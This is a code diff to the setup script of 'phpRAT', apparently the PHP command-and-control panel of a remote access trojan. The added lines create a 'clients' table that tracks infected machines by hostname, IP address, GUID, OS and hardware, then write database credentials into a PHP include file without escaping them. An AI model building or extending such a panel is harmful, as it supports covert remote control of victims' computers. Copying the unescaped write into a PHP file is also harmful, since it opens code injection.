@@ -23,7 +23,24 @@ if (isset($_POST['create'])) {
                 `ipaddress` varchar(128) NOT NULL
               )";
               if (mysqli_query($connect, $sql)) {
-                $success = "Created table 'users' inside database phpRAT on server " . $server . "!";
+                $sql = "CREATE TABLE `clients` (
+                  `cid` int(11) NOT NULL,
+                  `hostname` varchar(255) NOT NULL,
+                  `ipaddress` varchar(255) NOT NULL,
+                  `guid` varchar(255) NOT NULL,
+                  `os` varchar(255) NOT NULL,
+                  `RAM` varchar(255) NOT NULL,
+                  `Processor` varchar(255) NOT NULL,
+                  `Graphics Card` varchar(255) NOT NULL,
+                  `Ping` varchar(255) NOT NULL
+                )";
+                if (mysqli_query($connect, $sql)) {
+                  $handle = fopen("includes/connect.php", "w");
+                  $content = '<?php $connect = mysqli_connect("'.$server.'", "'.$username.'", "'.$password.'", "phpRAT") or die("Unable to connect to database!") ?>';
+                  fwrite($handle, $content);
+                  fclose($handle);
+                  $success = "1";
+                }
               }else{
                 $error = "Error creating table 'users' inside database 'phpRAT'" . mysqli_error($connect);
               }
@@ -64,7 +81,8 @@ if (isset($_POST['create'])) {
             echo "<font color='red'>" .$error. "!</font>";
         }
         if (isset($success)) {
-            echo "<font color='green'>" .$success. "</font>";
+          echo "<font color='green'>phpRAT has been installed. You will be redirected in 5 seconds...<a href='index.php?p=home'>Click here if you are not redirected!</a></font>";
+          header("refresh:5;url=index.php?p=home");
         }
         ?>
       </form>
